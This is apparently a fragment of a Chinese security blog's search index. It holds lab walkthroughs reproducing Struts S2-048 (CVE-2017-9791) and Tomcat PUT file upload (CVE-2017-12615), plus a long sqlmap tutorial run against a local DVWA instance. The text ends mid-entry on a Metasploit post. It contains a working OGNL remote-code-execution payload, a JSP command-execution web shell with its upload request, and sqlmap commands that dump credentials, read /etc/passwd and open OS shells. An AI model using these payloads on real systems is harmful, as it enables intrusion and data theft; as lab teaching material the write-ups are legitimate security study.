","date":"2023-04-01","objectID":"/posts/cve/apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-9791/:1:0","tags":["CVE","APACHE"],"title":"S2-048 远程代码执行漏洞（CVE-2017-9791）","uri":"/posts/cve/apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-9791/"},{"categories":["CVE"],"content":"2 漏洞复现 打开链接： http://172.31.5.7:8084/integration/editGangster;jsessionid=768AAC20493D6CD33F9DF8EF6357FAFD 漏洞存在点： 在Gangster Name输入表达式，其它位置任意填写 ${2*2} 发现表达式成功执行 准备以下POC填入表单 %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess? (#_memberAccess=#dm): ((#container=#context['com.opensymphony.xwork2.ActionContext.container']). (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)) .(#ognlUtil.getExcludedPackageNames().clear()). (#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))). (#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec ('id').getInputStream())).(#q)} #id 返回当前用户的信息 成功获取到当前用户的信息 ","date":"2023-04-01","objectID":"/posts/cve/apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-9791/:2:0","tags":["CVE","APACHE"],"title":"S2-048 远程代码执行漏洞（CVE-2017-9791）","uri":"/posts/cve/apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-9791/"},{"categories":["CVE"],"content":"3 漏洞原理 影响版本: 2.0.0 - 2.3.32 参考链接：Struts S2-048 RCE漏洞分析 - 鑄劍師 - 博客园 (cnblogs.com) ","date":"2023-04-01","objectID":"/posts/cve/apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-9791/:3:0","tags":["CVE","APACHE"],"title":"S2-048 远程代码执行漏洞（CVE-2017-9791）","uri":"/posts/cve/apache%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-9791/"},{"categories":["CVE"],"content":"Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）复现 ","date":"2023-03-29","objectID":"/posts/cve/tomcat%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615/:0:0","tags":["CVE","tomcat"],"title":"Tomcat任意写文件漏洞复现(CVE-2017-12615)","uri":"/posts/cve/tomcat%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615/"},{"categories":["CVE"],"content":"1 实验环境 软件名称 版本 部署方式 IP cve-2017-12615 latest docker run -d -p 8083:8080 –name tomcat-cve docker.io/cved/cve-2017-12615 172.31.5.7 ","date":"2023-03-29","objectID":"/posts/cve/tomcat%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615/:1:0","tags":["CVE","tomcat"],"title":"Tomcat任意写文件漏洞复现(CVE-2017-12615)","uri":"/posts/cve/tomcat%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615/"},{"categories":["CVE"],"content":"2 漏洞复现 开启burp抓包，访问 172.31.5.7:8083 使用repeater 模块修改数据包，数据包内容如下： \u003c% if(\"user\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"p\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\"\u003cpre\u003e\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"\u003c/pre\"); } %\u003e 发送修改后的数据包，返回状态码为204，表示成功写入一个shell.jsp文件至服务器 注意：tomcat本身不允许上传*.jsp文件，因此请求头行修改为/shell.jsp/ 该请求到服务器后，文件名不允许有/，/被丢弃。因此最终生成文件名为shell.jsp 使用浏览器访问该程序，成功执行命令pwd（任意命令均可） http://172.31.5.7:8083/shell.jsp?pwd=user\u0026p=pwd ","date":"2023-03-29","objectID":"/posts/cve/tomcat%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615/:2:0","tags":["CVE","tomcat"],"title":"Tomcat任意写文件漏洞复现(CVE-2017-12615)","uri":"/posts/cve/tomcat%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615/"},{"categories":["CVE"],"content":"3 漏洞原理 该漏洞主要是因为tomcat的web.xml配置文件中的readonly参数值为false，使得我们可以通过PUT方法写入文件 docker exec -it tomcat-cve bash -c \"grep -A 2 readon conf/web.xml\" 所以修复该漏洞的方式也简单，将readonly的值设置为true即可 漏洞影响版本：Tomcat 7.0.0-7.0.79、8.5.19 ","date":"2023-03-29","objectID":"/posts/cve/tomcat%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615/:3:0","tags":["CVE","tomcat"],"title":"Tomcat任意写文件漏洞复现(CVE-2017-12615)","uri":"/posts/cve/tomcat%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0cve-2017-12615/"},{"categories":["Scanning Tools"],"content":"1 实验环境 软件名称 版本 部署方式 IP SQLmap latest 源码部署 172.31.5.7 DVWA latest docker run -d -p 80:80 –name dvwa docker.io/sagikazarmark/dvwa 172.31.5.7 ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:1:0","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"2 SQLmap简介 官方网站：http://sqlmap.org/， 下载地址：https://github.com/sqlmapproject/sqlmap/zipball/master Sqlmap是一款开源的渗透测试工具，可以自动检测和利用SQL注入漏洞以及接入该数据库的服务器。它拥有非常强大的检测引擎、具有多种特性的渗透测试器、通过数据库指纹提取访问底层文件系统并通过外带连接执行命令。 sqlmap支持的数据库有： MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB sqlmap支持五种不同的注入模式： 1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页 面返回时间是否增加）来判断。 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4、联合查询注入，可以使用union的情况下的注入。 5、堆查询注入，可以同时执行多条语句的执行时的注入。 ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:2:0","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"2 下载及安装 ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:3:0","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"2.1 Linux git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap cd sqlmap python sqlmap.py --update # 更新 python sqlmap.py -hh # 查看帮助信息 ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:3:1","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"2.2 windows 官网下载sqlmap的压缩包，解压后即可使用。但需要一些组件包的支持，需要有python2.7.x或者2.6.x环境支持。 ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:3:2","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"2.2. kali 默认安装（自带） ┌──(root㉿kali)-[~] └─# sqlmap --version 1.6.11#stable ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:3:3","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"3 参数详解 ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:4:0","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"3.1 Target：目标 -u URL, --url=URL 目标URL (e.g.\"http://www.site.com/vuln.php?id=1\")，使用-u或者--url -d DIRECT 直接连接数据库的连接字符串 -l LOGFILE 从Burp或者WebScarab代理日志文件中分析目标 -x SITEMAPURL 从远程网站地图（sitemap.xml）文件来解析目标 -m BULKFILE 将目标地址保存在文件中，一行为一个URL地址进行批量检测。 -g GOOGLEDORK 从谷歌中加载结果目标URL（只获取前100个结果，需要挂代理） -c CONFIGFILE 从配置ini文件中加载选项 -r REQUESTFILE 从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可 以跳过设置一些其他参数（比如cookie，POST数据，等等），请求是HTTPS的时需要配合这个--forcessl参数来使用，或者可以在Host头后门加上:443 目标URL 参数：-u或者–url 格式：http(s)://targeturl:port/… 例如：python sqlmap.py -u “http://www.target.com/vuln.php?id=1\" -f –banner –dbs –users 从文本中获取多个目标扫描 参数：-m 文件中保存url格式如下，sqlmap会一个一个检测 www.test1.com/vuln1.php?q=student www.test2.com/vuln2.asp?id=1 www.test3.com/vuln3/id/1* 从文件中加载HTTP请求 参数：-r sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。 比如文本文件内如下： POST/students.php HTTP/1.1 Host:www.magedu.com User-Agent:Mozilla/4.0 id=1 当请求是HTTPS的时候，需要配合–force-ssl参数来使用，或者可以在Host头后面加上:443 ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:4:1","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"3.2 Request：请求设置 --method：指定请求方法 --data：把数据以POST方式提交 --param：当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数 --cookie：设置cookie，提交请求的时候附带所设置的cookie --load-cookies：从文件获取cookie --user-agent：可以使用–user-anget参数来修改 --headers：可以通过–headers参数来增加额外的http头 --proxy：设置代理，可以避免本机地址被封禁 --delay：可以设定两个HTTP(S)请求间的延迟 防止发送过快导致被封ip --random-agent：使用–random-agnet参数来随机的从./txt/user-agents.txt中获取。当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。 --referer：在请求目标的时候可以自己伪造请求包中的referer –-level参数设定为3或者3以上的时候会尝试对referer注入。 参数：–data 此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST参数。 python sqlmap.py -u \"http://www.magedu.com/students.php\" --data=\"id=1\" -f --banner --dbs --users 利用正则过滤目标网址 参数：–scope python sqlmap.py -l burp_http.log --scope=\"(www)?\\.target\\.(com|net|org)\" 避免过多的错误请求被屏蔽 参数：–safe-url,–safe-freq 有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致后续无法进行测试。 绕过这个策略有两种方式： --safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。 --safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一遍安全连接。 ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:4:2","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"3.3 Optimization：优化 -o 开启所有优化开关 ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:4:3","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"3.4 Injection：注入 -p：设置想要测试的参数 --skip：不想要测试的参数可以通过 skip设置跳过 --dbms：指定数据库 节省sqlmap自己检测的时间 --os：指定数据库服务系统 节省sqlmap自己检测的时间 --tamper：使用sqlmap自带的tamper（脚本），或者自己写的tamper，来混淆payload，通常用来绕过waf和ips 测试参数 参数：-p, –skip sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。 -p \"id,user-anget\" 当你使用–level的值很大但是有个别参数不想测试的时候可以使用–skip参数。 --skip=\"user-agent,referer\" 在有些时候web服务器使用了伪静态，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加* sqlmap将会测试value1的位置是否可注入。 python sqlmap.py -u \"http://magedu/param1/value1*/param2/value2/\" 指定数据库服务器系统 参数：–os 默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。 ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:4:4","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"3.5 Detection：探测等级 --level=LEVEL 执行测试的等级（1-5，默认为1） --risk：（*慎用此参数有风险）， 共有四个风险等级（0-3），默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。 探测等级 参数：–level 共有五个等级，默认为1，最大为5，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。 这个参数不仅影响使用哪些payload，同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-gent/Referer头在level为3的时候就会测试。 总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。 **风险等级 ** 参数：–risk 共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。 在有些时候，例如在UPDATE/DELETE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。 测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。 ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:4:5","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"3.6 Enumeration：枚举数据 -a, --all 获取所有信息 -b, --banner 获取数据库管理系统的标识 --current-user 获取数据库管理系统当前用户 --current-db 获取数据库管理系统当前数据库 --hostname 获取数据库服务器的主机名称 --is-dba 检测DBMS当前用户是否DBA（数据库管理员） --users 枚举数据库管理系统用户 --passwords 枚举数据库管理系统用户密码哈希 --privileges 枚举数据库管理系统用户的权限 --roles 枚举数据库管理系统用户的角色 --dbs 枚举数据库管理系统数据库 --tables 枚举的DBMS数据库中的表 --columns 枚举DBMS数据库表列 --schema 枚举数据库架构 --count 检索表的项目数 --dump 转储数据库表项，即下载 --dump-all 转储数据库所有表项 --search 搜索列（S），表（S）和/或数据库名称（S） --comments 获取DBMS注释 -D DB 要进行枚举的指定数据库名 -T TBL DBMS数据库表枚举 -C COL DBMS数据库表列枚举 -X EXCLUDECOL DBMS数据库表不进行枚举 -U USER 用来进行枚举的数据库用户 --exclude-sysdbs 枚举表时排除系统数据库 --pivot-column=P.. Pivot columnname --where=DUMPWHERE Use WHEREcondition while table dumping --start=LIMITSTART 获取第一个查询输出数据位置 --stop=LIMITSTOP 获取最后查询的输出数据 --first=FIRSTCHAR 第一个查询输出字的字符获取 --last=LASTCHAR 最后查询的输出字字符获取 --sql-query=QUERY 要执行的SQL语句 --sql-shell 提示交互式SQL的shell --sql-file=SQLFILE 要执行的SQL文件 标志 参数：-b,–banner 大多数的数据库系统都有一个函数可以返回数据库的版本号，通常这个函数是version()或者变量 @@version，这主要取决于是什么数据库。 当前用户 参数：-current-user 在大多数据库中可以获取到管理数据的用户。 当前数据库 参数：–current-db 返还当前连接的数据库。 当前用户是否为管理员 参数：–is-dba 判断当前的用户是否为管理员，是的话会返回True。 列出数据库管理用户 参数：–users 当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。 列出并破解数据库用户的hash 参数：–passwords 当前用户有权限读取包含用户密码的表的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。 python sqlmap.py -u \"http://magedu/sqlmap/pgsql/students.php?id=1\" --passwords - v1 列出数据库管理员权限 参数：–privileges 当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你 哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。 列出数据库管理员角色 参数：–roles 当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的角色，也可以用-U参数指定你想看哪个用户的角色。仅适用于当前数据库是Oracle的时候。 列出数据库系统的数据库 参数：–dbs 当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。 列举数据库表 参数：–tables,–exclude-sysdbs,-D 当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。 如果你不提供-D参数来指定一个数据库的时候，sqlmap会列出数据库所有库的所有表。 –exclude-sysdbs参数是指可排除系统数据库。 需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。 列举数据库表中的字段 参数：–columns,-C,-T,-D 当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。 如果没有使用-D参数指定数据库时，默认会使用当前数据库。 ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:4:6","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"3.7 Brute force：爆破 --common-tables 检查存在共同表 --common-columns 检查存在共同列 User-defined function injection（用户自定义函数注入）： --udf-inject 注入用户自定义函数 --shared-lib=SHLIB 共享库的本地路径 ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:4:7","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"3.8 File system access：访问文件系统 --file-read=RFILE 从后端的数据库管理系统读取文件 --file-write=WFILE 上传文件到后端的数据库管理系统 --file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 从数据库服务器中读取文件 参数：–file-read 当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。 python sqlmap.py -u \"http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low\" -p id --file-read \"/etc/passwd\" **把文件上传到数据库服务器中 ** 参数：–file-write,–file-dest 当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。 python sqlmap.py -u \"http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low\" -p id python sqlmap.py -u \"http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low\" -p id --file-write=\"/opt/test_code/user.txt\" --filedest=\"/var/www/html/user.txt\" ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:4:8","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"3.9 Operating system access：访问操作系统 --os-cmd=OSCMD 执行操作系统命令 --os-shell 交互式的操作系统的shell --os-pwn 获取一个OOB shell，meterpreter或VNC --os-smbrelay 一键获取一个OOB shell，meterpreter或VNC --os-bof 存储过程缓冲区溢出利用 --priv-esc 数据库进程用户权限提升 --msf-path=MSFPATH Metasploit Framework 本地的安装路径 --tmp-path=TMPPATH 远程临时文件目录的绝对路径 获取整个表的数据 参数：–dump,-C,-T,-D,–start,–stop,–first,–last 如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取整个表的所有内容。 使用-D,-T参数指定想要获取哪个库的哪个表，不使用-D参数时，默认使用当前库。 python sqlmap.py -u \"http://magedu/sqlmap/firebird/students.php?id=1\" --dump -T users 可以获取指定库中的所有表的内容，只用-dump跟-D参数（不使用-T与-C参数）。也可以用-dump跟-C获取指定的字段内容。 sqlmap为每个表生成了一个CSV文件。 如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可以使用–stop1，如果想获取第二段与第三段数据，使用参数 –start 1 –stop 3。 也可以用–first与–last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中第三个字符到第五个字符的内容，使用–first 3 –last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。 获取所有数据库表的内容 参数：–dump-all,–exclude-sysdbs 使用–dump-all参数获取所有数据库表的内容，可同时加上–exclude-sysdbs排除系统数据库，只获取用户数据库的表，即业务数据。 搜索字段，表，数据库 参数：–search,-C,-T,-D –search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。 可以在以下三种情况下使用： -C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。 -T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名 -D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。 运行自定义的SQL语句 参数：–sql-query,–sql-shell sqlmap会自动检测确定使用哪种SQL注入技术，如何插入检索语句。 如果是SELECT查询语句，sqlmap将会输出结果。如果是通过SQL注入执行其他语句，需要测试是否支持多语句执行SQL语句。 $python sqlmap.py -u \"http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026Submit=Submit#\" --sql-query \"SELECT 'magedu'\" -v1 运行任意操作系统命令 参数：–os-cmd,–os-shell python sqlmap.py -u \"127.0.0.1:8080/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" - -cookie=\"PHPSESSID=isgvp2rv4uts46jbkb9bouq6ir; security=low\" -p id --os-cmd id 用–os-shell参数也可以模拟一个真实的shell，可以输入你想执行的命令。 当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言： 1、ASP 2、ASP.NET 3、JSP 4、PHP 爬行网站URL 参数：–crawl sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。此时的URL可以不带参数。 python sqlmap.py -u \"http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026Submit=Submit#\" --batch --crawl=3 python sqlmap.py -u \"http://127.0.0.1:8080/vulnerabilities/sqli/? id=1\u0026Submit=Submit#\" --batch --crawl=3 定义dump数据的格式 参数：–dump-format 输出的格式可定义为：CSV，HTML，SQLITE 自定义输出的路径 参数：–output-dir sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径 例如：–output-dir=/tmp ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:4:9","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["Scanning Tools"],"content":"4 实际利用(dvwa) 当给sqlmap这么一个url的时候，它会： 1、判断可注入的参数 2、判断可以用那种SQL注入技术来注入 3、识别出哪种数据库 4、根据用户选择，读取哪些数据 如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数 0、只显示python错误以及严重的信息。 1、同时显示基本信息和警告信息。（默认） 2、同时显示debug信息。 3、同时显示注入的payload。 4、同时显示HTTP请求。 5、同时显示HTTP响应头。 6、同时显示HTTP响应页面。 如果你想看到sqlmap发送的测试payload最好的等级就是3。 # 判断注入点，因系统需要登录所以要加 cookie python sqlmap.py -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\" -p id --batch # 检测站点包含哪些数据库 python sqlmap.py -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\" -p id --dbs --batch 技巧：在实际检测过程中，sqlmap会不停的询问，需要手工输入Y/N来进行下一步操作，可以使用参数“–batch”命令来自动答复和判断 可以看到有四个数据库，选择dvwa数据库获取其中的表名 python sqlmap.py -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\" -D dvwa --tables --batch 可以看到，dvwa里面有两张表，分别是guestbook，users。选择users表获取表中的字段 python sqlmap.py -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\" -D dvwa -T users --columns 可以看到里面有password，直接获取我们想要的内容 (账号/密码) python sqlmap.py -u \"http://172.31.5.7/vulnerabilities/sqli/?id=1\u0026Submit=Submit#\" --cookie=\"PHPSESSID=roh7b5kugi2pm1hbmnll8oohk4; security=low\" -D dvwa -T users -C last_name,password --dump --batch ","date":"2023-03-26","objectID":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/:5:0","tags":[],"title":"SQLmap安装和使用","uri":"/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"},{"categories":["MSF"],"content":"（1）MS08-067、MS10-018、MS17-010、CVE-2018-4878漏洞复现 ","date":"2023-03-19","objectID":"/posts/msf/msf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:0:0","tags":[],"title":"MSF漏洞利用","uri":"/posts/msf/msf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["MSF"],"content":"1 实验环境 软件名称 版本 部署方式 IP ","date":"2023-03-19","objectID":"/posts/msf/msf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:1:0","tags":[],"title":"MSF漏洞利用","uri":"/posts/msf/msf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["MSF"],"content":"2 